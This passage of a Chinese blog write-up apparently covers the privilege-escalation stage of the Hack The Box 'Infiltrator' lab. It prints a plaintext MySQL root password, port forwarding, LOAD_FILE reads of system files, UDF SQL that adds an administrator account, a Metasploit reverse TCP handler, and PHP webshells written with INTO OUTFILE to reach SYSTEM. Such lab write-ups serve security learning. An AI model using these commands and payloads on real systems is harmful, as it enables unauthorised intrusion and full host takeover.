OutputMessenger.exe</span><br><span class="line">12/19/2022  12:07 PM             1,788 OutputMessenger.exe.config</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          Plugins</span><br><span class="line">09/12/2020  03:04 PM           156,522 RING.WAV</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          SpellCheck</span><br><span class="line">01/30/2021  02:03 PM           275,968 System.Data.SQLite.dll</span><br><span class="line">01/30/2021  02:03 PM           183,808 System.Data.SQLite.EF6.dll</span><br><span class="line">01/30/2021  02:03 PM           183,808 System.Data.SQLite.Linq.dll</span><br><span class="line">07/19/2016  02:53 PM           191,152 System.Net.Http.dll</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          TeamTalk</span><br><span class="line">04/09/2022  11:38 AM         5,941,072 TeamTalk5Pro.dll</span><br><span class="line">04/09/2022  11:38 AM           128,512 TeamTalk5Pro.NET.dll</span><br><span class="line">02/23/2024  06:06 AM            33,424 unins000.dat</span><br><span class="line">02/23/2024  06:06 AM           724,224 unins000.exe</span><br><span class="line">02/23/2024  06:06 AM            11,401 unins000.msg</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          x64</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          x86</span><br><span class="line">              45 File(s)     26,855,213 bytes</span><br><span class="line">              10 Dir(s)  46,407,237,632 bytes free</span><br></pre></td></tr></table></figure>

<p>几个目录翻了翻，没找到啥有用的，希望下载下来的zip不要就是我刚刚看的这玩意</p>
<p>OutputMessengerMysql.zip解压包里吐出一个好东西</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat OutputMysql.ini </span><br><span class="line">[SETTINGS]</span><br><span class="line">SQLPort=14406</span><br><span class="line">Version=1.0.0</span><br><span class="line"></span><br><span class="line">[DBCONFIG]</span><br><span class="line">DBUsername=root</span><br><span class="line">DBPassword=ibWijteig5</span><br><span class="line">DBName=outputwall</span><br><span class="line"></span><br><span class="line">[PATHCONFIG]</span><br><span class="line">;mysql5.6.17</span><br><span class="line">MySQL=mysql</span><br><span class="line">Log=log</span><br><span class="line">def_conf=settings</span><br><span class="line">MySQL_data=data</span><br><span class="line">Backup=backup</span><br></pre></td></tr></table></figure>

<p>这root不会是真root吧，那我可直接冲了</p>
<p>我现在需要将里面的端口转发到我本地</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add  -l 53366 -L 0.0.0.0  -p 14406 -r 10.10.11.31</span><br></pre></td></tr></table></figure>
<p>说实话，msf打靶机舒服的。如果不用msf，这里可以用chisel、frp、nps等等穿透工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -uroot -P 53366 -p</span><br></pre></td></tr></table></figure>
<p>看上面那个DBName&#x3D;outputwall，可以确认拿下了数据库权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| outputwall         |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [outputwall]&gt; show tables;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Tables_in_outputwall      |</span><br><span class="line">+---------------------------+</span><br><span class="line">| ot_attachment             |</span><br><span class="line">| ot_comments               |</span><br><span class="line">| ot_entity                 |</span><br><span class="line">| ot_entity_accounts        |</span><br><span class="line">| ot_entity_daysoff         |</span><br><span class="line">| ot_entity_setting         |</span><br><span class="line">| ot_sessions               |</span><br><span class="line">| ot_user_notification_read |</span><br><span class="line">| ot_user_notifications     |</span><br><span class="line">| ot_wall_activity          |</span><br><span class="line">| ot_wall_favorite          |</span><br><span class="line">| ot_wall_notification      |</span><br><span class="line">| ot_wall_posts             |</span><br><span class="line">| ot_wall_tagmessages       |</span><br><span class="line">| ot_wall_tags              |</span><br><span class="line">| ot_wall_tokens            |</span><br><span class="line">| ot_wall_usermessages      |</span><br><span class="line">+---------------------------+</span><br><span class="line">17 rows in set (0.869 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [outputwall]&gt; SELECT LOAD_FILE(&#x27;C:\\Users\\Administrator\\Desktop\\root.txt&#x27;);</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| LOAD_FILE(&#x27;C:\\Users\\Administrator\\Desktop\\root.txt&#x27;) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| 6c25a2e506000ffc77da4fbc0ee3a032</span><br><span class="line">                       |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">1 row in set (0.870 sec)</span><br></pre></td></tr></table></figure>

<p>我确定了，这是真root，都可以读Administrator的flag了<br>如果是打工，或者是做什么der项目，估计到这里我就下班了</p>
<p>但是，这么nb的靶机肯定还有东西没教我，东西没学到怎能撤退</p>
<p>#mysql #查看安装路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [outputwall]&gt; select @@basedir;</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| @@basedir                                                      |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| C:\Program Files\Output Messenger Server\Plugins\Output\mysql\ |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>#mysql  #udf </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/mysql/mysql_udf_payload) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.2:4444 </span><br><span class="line">[*] 127.0.0.1:53366 - Checking target architecture...</span><br><span class="line">[*] 127.0.0.1:53366 - Checking for sys_exec()...</span><br><span class="line">[*] 127.0.0.1:53366 - Checking target architecture...</span><br><span class="line">[*] 127.0.0.1:53366 - Checking for MySQL plugin directory...</span><br><span class="line">[*] 127.0.0.1:53366 - Target arch (win32) and target path both okay.</span><br><span class="line">[*] 127.0.0.1:53366 - Uploading lib_mysqludf_sys_32.dll library to C:/Program Files/Output Messenger Server/Plugins/Output/mysql/lib/plugin/yQUJZIok.dll...</span><br><span class="line">[-] 127.0.0.1:53366 - MySQL Error: Mysql::ServerError Can&#x27;t create/write to file &#x27;C:\Program Files\Output Messenger Server\Plugins\Output\mysql\lib\plugin\yQUJZIok.dll&#x27; (Errcode: 2 &quot;No such file or directory&quot;)</span><br><span class="line">[-] 127.0.0.1:53366 - MySQL Error: Mysql::ServerError::CantOpenLibrary Can&#x27;t open shared library &#x27;yQUJZIok.dll&#x27; (errno: 2, The specified module could not be found.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>怀疑是没传上去，手动试试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MySQL 5.6 对应 MariaDB 10.0</span><br><span class="line">MySQL 5.7 对应 MariaDB 10.2</span><br></pre></td></tr></table></figure>
<p>而我现在用的是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [outputwall]&gt; select version();</span><br><span class="line">+-----------------+</span><br><span class="line">| version()       |</span><br><span class="line">+-----------------+</span><br><span class="line">| 10.1.19-MariaDB |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.901 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>udf提权在Mysql &gt;&#x3D; 5.1 时，需要在那个<code>lib\plugin</code>路径下<br>就是说我得先创建这个路径，然后再传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\M.harris&gt;dir &quot;C:/Program Files/Output Messenger Server/Plugins/&quot;</span><br><span class="line">dir &quot;C:/Program Files/Output Messenger Server/Plugins/&quot;</span><br><span class="line"> Volume in drive C has no label.</span><br><span class="line"> Volume Serial Number is 96C7-B603</span><br><span class="line"></span><br><span class="line"> Directory of C:\Program Files\Output Messenger Server\Plugins</span><br><span class="line"></span><br><span class="line">File Not Found</span><br></pre></td></tr></table></figure>

<p>看来完整的靶机体验肯定有udf提权，大概吧</p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-mysql#windows">3306 - Pentesting Mysql | HackTricks</a></p>
<p>可以用这个命令来进行udf提权，其中需要先把<code>lib_mysqludf_sys.dll</code>上传到目标机器,这个dll在msf的目录里可以直接找到，也有现成模块mysql_udf_payload用，但是刚刚失败了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># CHech the linux comments for more indications</span><br><span class="line">USE mysql;</span><br><span class="line">CREATE TABLE npn(line blob);</span><br><span class="line">INSERT INTO npn values(load_file(&#x27;C:\\Users\\M.harris\\lib_mysqludf_sys.dll&#x27;));</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">SELECT * FROM mysql.npn INTO DUMPFILE &#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\mysql\\lib\\plugin\\lib_mysqludf_sys_32.dll&#x27;;</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS integer SONAME &#x27;lib_mysqludf_sys_32.dll&#x27;;</span><br><span class="line">SELECT sys_exec(&quot;net user npn npn12345678 /add&quot;);</span><br><span class="line">SELECT sys_exec(&quot;net localgroup Administrators npn /add&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [outputwall]&gt; show variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.905 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>G了，那个文件夹它真没有，而我的用户（m.harris）没那个写入权限，没办法进行修改</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [mysql]&gt; SELECT * FROM mysql.npn INTO DUMPFILE &#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\mysql\\lib\\plugin\\lib_mysqludf_sys_32.dll&#x27;;</span><br><span class="line">ERROR 1 (HY000): Can&#x27;t create/write to file &#x27;C:\Program Files\Output Messenger Server\Plugins\Output\mysql\lib\plugin\lib_mysqludf_sys_32.dll&#x27; (Errcode: 2 &quot;No such file or directory&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>看来这个靶机的完整体验还得再看看那个<code>OutputMessengerApache.zip</code><br>映入眼帘的是OutputApache.ini </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat OutputApache.ini </span><br><span class="line">[SETTINGS]</span><br><span class="line">Address=127.0.0.1</span><br><span class="line">WebPort=14126</span><br><span class="line">Version=1.0.0</span><br><span class="line"></span><br><span class="line">[NOTIFICATION]</span><br><span class="line">address=localhost</span><br><span class="line">port=8124</span><br><span class="line"></span><br><span class="line">[PATHCONFIG]</span><br><span class="line">;apache2.4.9</span><br><span class="line">Apache=apache2</span><br><span class="line">;php5.5.12</span><br><span class="line">PHP=php</span><br><span class="line">Log=log</span><br><span class="line">def_conf=settings</span><br><span class="line">WebRoot=www</span><br><span class="line">Backup=backup</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先把端口转发过来看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add  -l 14126 -L 0.0.0.0  -p 14126 -r 10.10.11.31</span><br></pre></td></tr></table></figure>
<p>看这个质朴的样子，大概就是要我直接写一个webshell了吧<br><img src="https://gcore.jsdelivr.net/gh/bilibiliganb/mypic/img20240907142601.png"></p>
<p>但是我现在并不知道他的目录在哪</p>
<p>而且我没权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> Directory of C:\Program Files</span><br><span class="line"></span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          .</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          ..</span><br><span class="line">12/04/2023  10:22 AM    &lt;DIR&gt;          Common Files</span><br><span class="line">08/21/2024  01:50 PM    &lt;DIR&gt;          Hyper-V</span><br><span class="line">02/19/2024  04:52 AM    &lt;DIR&gt;          internet explorer</span><br><span class="line">02/23/2024  06:06 AM    &lt;DIR&gt;          Output Messenger</span><br><span class="line">09/06/2024  06:17 AM    &lt;DIR&gt;          Output Messenger Server</span><br><span class="line">12/12/2023  11:04 AM    &lt;DIR&gt;          PackageManagement</span><br><span class="line">02/19/2024  05:16 AM    &lt;DIR&gt;          Update Services</span><br><span class="line">12/04/2023  10:23 AM    &lt;DIR&gt;          VMware</span><br><span class="line">11/05/2022  12:03 PM    &lt;DIR&gt;          Windows Defender</span><br><span class="line">08/21/2024  01:50 PM    &lt;DIR&gt;          Windows Defender Advanced Threat Protection</span><br><span class="line">11/05/2022  12:03 PM    &lt;DIR&gt;          Windows Mail</span><br><span class="line">08/21/2024  01:50 PM    &lt;DIR&gt;          Windows Media Player</span><br><span class="line">09/15/2018  12:19 AM    &lt;DIR&gt;          Windows Multimedia Platform</span><br><span class="line">09/15/2018  12:28 AM    &lt;DIR&gt;          windows nt</span><br><span class="line">11/05/2022  12:03 PM    &lt;DIR&gt;          Windows Photo Viewer</span><br><span class="line">09/15/2018  12:19 AM    &lt;DIR&gt;          Windows Portable Devices</span><br><span class="line">09/15/2018  12:19 AM    &lt;DIR&gt;          Windows Security</span><br><span class="line">12/12/2023  11:04 AM    &lt;DIR&gt;          WindowsPowerShell</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">              20 Dir(s)  46,382,149,632 bytes free</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>这里已知</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Output Messenger Server\Plugins\Output\mysql\</span><br></pre></td></tr></table></figure>
<p>是mysql的目录<br>使用msyql读一下my.ini看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\mysql\\my.ini&#x27;);</span><br></pre></td></tr></table></figure>
<p>结果是读取成功</p>
<p>在压缩包<code>OutputMessengerMysql.zip</code>的解压目录里<code>find my.ini</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ find . -name &quot;my.ini&quot; 2&gt;/dev/null</span><br><span class="line">./settings/my.ini</span><br><span class="line">./mysql/my.ini</span><br><span class="line">./mysql/data/my.ini</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里最大概率是第二个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mysql/my.ini</span><br></pre></td></tr></table></figure>

<p>但是为了验证正确性<br>我再来读一次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\mysql\\data\\my.ini&#x27;);</span><br></pre></td></tr></table></figure>
<p>成功了<br>那么可以确认了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Output Messenger Server\Plugins\Output\mysql\</span><br><span class="line">对应</span><br><span class="line">OutputMessengerMysql.zip压缩包的子目录mysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Program Files\Output Messenger Server\Plugins\Output\ 就是这个zip解压的地方</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\OutputMysql.ini&#x27;);</span><br></pre></td></tr></table></figure>
<p><img src="https://gcore.jsdelivr.net/gh/bilibiliganb/mypic/img20240907144147.png"></p>
<p>合理怀疑另一个zip也就是OutputMessengerApache.zip 也会在这里解压</p>
<p>只需要读OutputApache.ini即可进行验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\OutputApache.ini&#x27;);</span><br></pre></td></tr></table></figure>
<p>猜对了，读成功了</p>
<p>那么整体的路径就拨云见日</p>
<p>现在写webshell到www路径即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_GET[&#x27;qwer&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_GET[&#x27;qwer&#x27;]);?&gt;&quot; INTO OUTFILE &quot;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\www\\gshell.php&quot;;</span><br></pre></td></tr></table></figure>
<p>命令执行不了，难受，还把靶机搞垮了</p>
<p>赶紧读一下php.ini</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./settings/php.ini</span><br><span class="line">./php/php.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\php\\php.ini&#x27;);</span><br><span class="line"></span><br><span class="line">这个disable_functions里面是空的</span><br><span class="line"></span><br><span class="line">SELECT LOAD_FILE(&#x27;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\settings\\php.ini&#x27;);</span><br><span class="line">这个也是空的？？？</span><br></pre></td></tr></table></figure>
<p>难不成之前成功了，只是因为执行命令把靶机搞垮了而已，还是说运气不好别人刚好在重置靶机？？？</p>
<p>算了我也重置一次靶机，重新走一遍取经路</p>
<p>干脆用最朴实的php命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php echo `whoami`;?&gt;&quot; INTO OUTFILE &quot;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\www\\whoami.php&quot;;</span><br></pre></td></tr></table></figure>

<p>至此，得到朴实无华的<code>nt authority\system</code><br><img src="https://gcore.jsdelivr.net/gh/bilibiliganb/mypic/img20240907152646.png"><br>如果实在想要搞到msf的shell，可以把写入的php文件改成对应的载荷的路径，假如使用的是”reverse.exe”，这样就可以快乐的使用meterpreter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php echo `path/reverse.exe`;?&gt;&quot; INTO OUTFILE &quot;C:\\Program Files\\Output Messenger Server\\Plugins\\Output\\www\\whoami.php&quot;;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对这个渗透过程进行梳理</p>
<p>1.首先对目标进行端口扫描，服务识别，得到端口、域名、以及主机相关信息<br>2.然后配置好dns服务器，为更好地域渗透做准备<br>3.收集目标系统用户信息，构造用户字典<br>4.使用kerbrute枚举存在的用户<br>5.使用GetNPUsers获取不需要Kerberos预身份验证的用户，得到一份hash，并使用hashcat进行破解<br>6.利用得到的凭据进行getshell、以及密码喷洒<br>7.使用bloodhound获取域控的结构，并分析出一条可用的攻击路径，并根据攻击路径拿到立足点<br>8.使用msf进行权限维持<br>9.使用PEASS-NG遍历可能的提权路径，根据进程列表中的进程找到了两个zip压缩包，分别为msyql和apache<br>10.分析两个压缩包，使用端口转发，暴露目标机器mysql的数据库端口，获取了数据库root权限<br>11.猜测apache的网站路径，通过mysql进行文件写入，使用php进行命令执行，由于php是使用的<code>nt authority\system</code>，那么拿到webshell即可拿到最高权限。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://SUqerBrave.github.io">SUqerBrave</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://suqerbrave.github.io/2024/09/07/HTB-Infiltrator/">https://suqerbrave.github.io/2024/09/07/HTB-Infiltrator/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://SUqerBrave.github.io" target="_blank">Life lover</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HTB/">HTB</a><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/734167.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/08/12/sliver%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%88%9D%E5%A7%8B%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%84%9A%E6%89%8B%E6%9E%B6/" title="sliver源码分析-初始化以及脚手架"><img class="cover" src="/img/734167.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">sliver源码分析-初始化以及脚手架</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">SUqerBrave</div><div class="author-info__description">Some sec notes</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/SUqerBrave"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%95%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">引言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">3.</span> <span class="toc-text">域渗透准备工作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">WEB渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SMB%E6%B8%97%E9%80%8F"><span class="toc-number">5.</span> <span class="toc-text">SMB渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GetNPUsers"><span class="toc-number">5.1.</span> <span class="toc-text">GetNPUsers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashcat"><span class="toc-number">5.2.</span> <span class="toc-text">Hashcat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E5%B0%84"><span class="toc-number">6.1.</span> <span class="toc-text">密码喷射</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getTGT"><span class="toc-number">6.2.</span> <span class="toc-text">getTGT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bloodhound"><span class="toc-number">6.3.</span> <span class="toc-text">bloodhound</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 